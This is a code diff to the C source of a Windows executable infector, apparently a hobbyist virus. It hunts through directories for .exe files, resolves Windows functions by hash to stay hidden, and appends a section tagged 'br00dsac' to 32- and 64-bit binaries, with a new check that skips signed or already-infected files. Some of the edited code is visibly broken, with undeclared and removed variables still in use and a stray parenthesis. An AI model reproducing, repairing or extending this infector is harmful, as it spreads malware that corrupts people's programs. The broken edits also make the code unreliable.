@@ -62,6 +62,7 @@ typedef int (* strnicmpHeader)(const char *, const char *, size_t);
 typedef size_t (* strlenHeader)(const char *);
 typedef void * (* memcpyHeader)(void *, const void *, size_t);
 typedef void * (* memsetHeader)(void *, int, size_t);
+typedef int (* memcmpHeader)(const void *, const void *, size_t);
 typedef HMODULE (* LoadLibraryAHeader)(LPCSTR);
 typedef DWORD (* GetTempPath2AHeader)(DWORD, LPSTR);
 typedef DWORD (* GetFileAttributesAHeader)(LPCSTR);
@@ -85,6 +86,7 @@ typedef struct __InfectorIAT
    strlenHeader strlen;
    memcpyHeader memcpy;
    memsetHeader memset;
+   memcmpHeader memcmp;
 
    /* kernel32 */
    LoadLibraryAHeader loadLibrary;
@@ -101,8 +103,8 @@ typedef struct __InfectorIAT
 } InfectorIAT;
 
 /* the CVector functionality provides a basic C-style version of the vector object
- * in C++. understanding their functionality should be pretty straight-forward to
- * understand. */
+ * in C++. understanding their functionality should be pretty straight-forward.
+ */
 typedef struct __CVector
 {
    size_t type_size;
@@ -711,15 +713,11 @@ CVector infect_32bit(InfectorIAT *iat, CVector *module)
    IMAGE_SECTION_HEADER *section_table = RECAST(PIMAGE_SECTION_HEADER,byte_module+CVECTOR_CAST(module,PIMAGE_DOS_HEADER)->e_lfanew+nt_headers_size);
    IMAGE_SECTION_HEADER *last_section = &section_table[nt_headers->FileHeader.NumberOfSections-1];
    IMAGE_SECTION_HEADER *new_section = &section_table[nt_headers->FileHeader.NumberOfSections];
-   CVector result = cvector_alloc(iat, sizeof(uint8_t), 0);
    DWORD new_section_offset = last_section->PointerToRawData + last_section->SizeOfRawData;
 
    /* align the new section offset to the file alignment boundary */
    if (new_section_offset % nt_headers->OptionalHeader.FileAlignment != 0)
       new_section_offset += nt_headers->OptionalHeader.FileAlignment - (new_section_offset % nt_headers->OptionalHeader.FileAlignment);
-
-   if (new_section_offset < module->elements) /* there's appended data to this binary, do not tamper */
-      return result;
 
    /* increment the number of sections in the binary */
    nt_headers->FileHeader.NumberOfSections += 1;
@@ -762,9 +760,6 @@ CVector infect_64bit(InfectorIAT *iat, CVector *module)
    if (new_section_offset % nt_headers->OptionalHeader.FileAlignment != 0)
       new_section_offset += nt_headers->OptionalHeader.FileAlignment - (new_section_offset % nt_headers->OptionalHeader.FileAlignment);
 
-   if (new_section_offset < module->elements) /* there's appended data to this binary, do not tamper */
-      return result;
-
    /* increment the number of sections in the binary */
    nt_headers->FileHeader.NumberOfSections += 1;
 
@@ -789,6 +784,42 @@ CVector infect_64bit(InfectorIAT *iat, CVector *module)
    cvector_free(iat, &new_section_data);
             
    return result;
+}
+
+BOOL is_infectable(InfectorIAT *iat, CVector *exe_buffer)
+{
+   /* verify the headers */
+   IMAGE_DOS_HEADER *dos_header = CVECTOR_CAST(exe_buffer,PIMAGE_DOS_HEADER);
+
+   if (dos_header->e_magic != IMAGE_DOS_SIGNATURE)
+      return FALSE;
+            
+   IMAGE_NT_HEADERS *nt_headers = RECAST(PIMAGE_NT_HEADERS,CVECTOR_CAST(exe_buffer,uint8_t *)+dos_header->e_lfanew);
+
+   if (nt_headers->Signature != IMAGE_NT_SIGNATURE)
+      return FALSE;
+
+   /* get the last section to verify if we've already infected this executable */
+   size_t nt_headers_size = sizeof(DWORD)+sizeof(IMAGE_FILE_HEADER)+nt_headers->FileHeader.SizeOfOptionalHeader;
+   IMAGE_SECTION_HEADER *section_table = RECAST(PIMAGE_SECTION_HEADER,CVECTOR_CAST(exe_buffer, uint8_t *)+dos_header->e_lfanew+nt_headers_size);
+   IMAGE_SECTION_HEADER *last_section = &section_table[nt_headers->FileHeader.NumberOfSections-1];
+
+   if (iat->memcmp(last_section->Name, "br00dsac", 8) == 0)
+      return FALSE;
+
+   /* if there's appended data at the end of this file, cowardly refuse to infect
+    * (it might be signed)
+    */
+   DWORD section_offset = last_section->PointerToRawData + last_section->SizeOfRawData;
+
+   /* neurotically align even though a valid executable needs to be file aligned lol */
+   if (section_offset % nt_headers->OptionalHeader.FileAlignment != 0)
+      section_offset += nt_headers->OptionalHeader.FileAlignment - (section_offset % nt_headers->OptionalHeader.FileAlignment);
+
+   /* if the section offset is less than the amount of bytes in the executable, there's appended data,
+    * and we don't want that (might be signing data)
+    */
+   return section_offset >= exe_buffer->elements;
 }
 
 void load_infector_iat(InfectorIAT *iat)
@@ -822,6 +853,7 @@ void load_infector_iat(InfectorIAT *iat)
    iat->strlen = RECAST(strlenHeader,get_proc_by_hash(msvcrtModule, 0x58ba3d97));
    iat->memcpy = RECAST(memcpyHeader,get_proc_by_hash(msvcrtModule, 0xa45cec64));
    iat->memset = RECAST(memsetHeader,get_proc_by_hash(msvcrtModule, 0xcb80cc06));
+   iat->memcmp = RECAST(memcmpHeader,get_proc_by_hash(msvcrtModule, 0xaf3caa0a));
    PIMAGE_DOS_HEADER shell32Module = RECAST(PIMAGE_DOS_HEADER,iat->loadLibrary("shell32.dll"));
    iat->getFolderPath = RECAST(SHGetFolderPathAHeader,get_proc_by_hash(shell32Module, 0xe8692330));
 }
@@ -864,11 +896,10 @@ int infect(void)
       char *search_visit;
       cvector_dequeue(&iat, &search_stack, &search_visit);
       
-      char starSearch[] = "\\*";
-      char exeSearch[] = ".exe";
-      char *search_string = RECAST(char *,iat.malloc(iat.strlen(search_visit)+iat.strlen(starSearch)+1));
+      char star_search[] = "\\*";
+      char *search_string = RECAST(char *,iat.malloc(iat.strlen(search_visit)+iat.strlen(star_search)+1));
       iat.memcpy(search_string, search_visit, iat.strlen(search_visit)+1);
-      iat.strncat(search_string, starSearch, iat.strlen(starSearch));
+      iat.strncat(search_string, star_search, iat.strlen(star_search));
       
       WIN32_FIND_DATAA find_data;
       HANDLE find_handle = iat.findFirstFile(search_string, &find_data);
@@ -880,9 +911,10 @@ int infect(void)
       {
          char slash[] = "\\";
          char dot[] = ".";
-         char dotDot[] = "..";
+         char dot_dot[] = "..";
+         char exe_search[] = ".exe";
 
-         if (iat.strnicmp(find_data.cFileName, dot, 2) == 0 || iat.strnicmp(find_data.cFileName, dotDot, 3) == 0)
+         if (iat.strnicmp(find_data.cFileName, dot, 2) == 0 || iat.strnicmp(find_data.cFileName, dot_dot, 3) == 0)
             continue;
          else if ((find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0x10 &&
                   (find_data.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) != 0x400) // if directory and not symlink
@@ -895,7 +927,7 @@ int infect(void)
             cvector_push(&iat, &search_stack, &new_directory);
          }
          /* check if the filename is an exe */
-         else if (iat.strnicmp(find_data.cFileName+(iat.strlen(find_data.cFileName)-4), exeSearch, iat.strlen(exeSearch)) == 0)
+         else if (iat.strnicmp(find_data.cFileName+(iat.strlen(find_data.cFileName)-4), exe_search, iat.strlen(exe_search)) == 0)
          {
             char *found_executable = RECAST(char *,iat.malloc(iat.strlen(search_visit)+iat.strlen(slash)+iat.strlen(find_data.cFileName)+1));
             iat.memcpy(found_executable, search_visit, iat.strlen(search_visit)+1);
@@ -911,7 +943,7 @@ int infect(void)
       iat.free(search_visit);
    }
 
-   /* iterate over the found executables and determine if they are viable for infection */
+   /* iterate over the found executables and infect them if they are viable */
    for (size_t i=0; i<found_executables.elements; ++i)
    {
       char *executable = CVECTOR_CAST(&found_executables, char **)[i];
@@ -937,49 +969,42 @@ int infect(void)
       if (!iat.readFile(exe_handle, CVECTOR_CAST(&exe_buffer, uint8_t *), exe_buffer.elements, &bytes_read, NULL))
          goto free_file;
 
+      if (bytes_read != file_size)
+         goto free_file;
+      
       iat.closeHandle(exe_handle);
       exe_handle = INVALID_HANDLE_VALUE;
-      IMAGE_DOS_HEADER *dos_header = CVECTOR_CAST(&exe_buffer,PIMAGE_DOS_HEADER);
 
-      if (dos_header->e_magic != IMAGE_DOS_SIGNATURE)
+      /* verify if the binary is even infectable */
+      if (!is_infectable(&iat, &exe_buffer))
          goto free_file;
-            
-      IMAGE_NT_HEADERS *nt_headers = RECAST(PIMAGE_NT_HEADERS,CVECTOR_CAST(&exe_buffer,uint8_t *)+dos_header->e_lfanew);
 
-      if (nt_headers->Signature != IMAGE_NT_SIGNATURE)
-         goto free_file;
-            
-      CVector rewritten_image = cvector_alloc(&iat, sizeof(uint8_t), 0);
+      CVector rewritten_image;
 
       if (nt_headers->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
          rewritten_image = infect_32bit(&iat, &exe_buffer);
       else if (nt_headers->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
          rewritten_image = infect_64bit(&iat, &exe_buffer);
       
-      if (rewritten_image.data != NULL)
-      {
-         HANDLE infected_handle = iat.createFile(executable,
-                                                 GENERIC_WRITE,
-                                                 0,
-                                                 NULL,
-                                                 CREATE_ALWAYS,
-                                                 FILE_ATTRIBUTE_NORMAL,
-                                                 NULL);
+      exe_handle = iat.createFile(executable,
+                                  GENERIC_WRITE,
+                                  0,
+                                  NULL,
+                                  CREATE_ALWAYS,
+                                  FILE_ATTRIBUTE_NORMAL,
+                                  NULL);
 
-         if (infected_handle == INVALID_HANDLE_VALUE)
-            goto infected_file_cleanup;
+      if (infected_handle == INVALID_HANDLE_VALUE)
+         goto infected_file_cleanup;
 
-         DWORD bytes_written = 0;
+      DWORD bytes_written = 0;
 
-         if (!iat.writeFile(infected_handle, rewritten_image.data, rewritten_image.elements, &bytes_written, NULL))
-            goto infected_file_close;
-         
-      infected_file_close:
-         iat.closeHandle(infected_handle);
+      iat.writeFile(exe_handle, rewritten_image.data, rewritten_image.elements, &bytes_written, NULL))
+      iat.closeHandle(exe_handle);
+      exe_handle = INVALID_HANDLE_VALUE;
 
-      infected_file_cleanup:
-         cvector_free(&iat, &rewritten_image);
-      }
+   infected_file_cleanup:
+      cvector_free(&iat, &rewritten_image);
 
    free_file:
       cvector_free(&iat, &exe_buffer);
@@ -996,7 +1021,7 @@ int infect(void)
    return 0;
 }
 
-int main(int argc, char *argv[])
+int WINAPI WinMain(HINSTANCE instance, HINSTANCE prev_instance, LPSTR command_line, int show_command)
 {
    //infect();
    return infect();
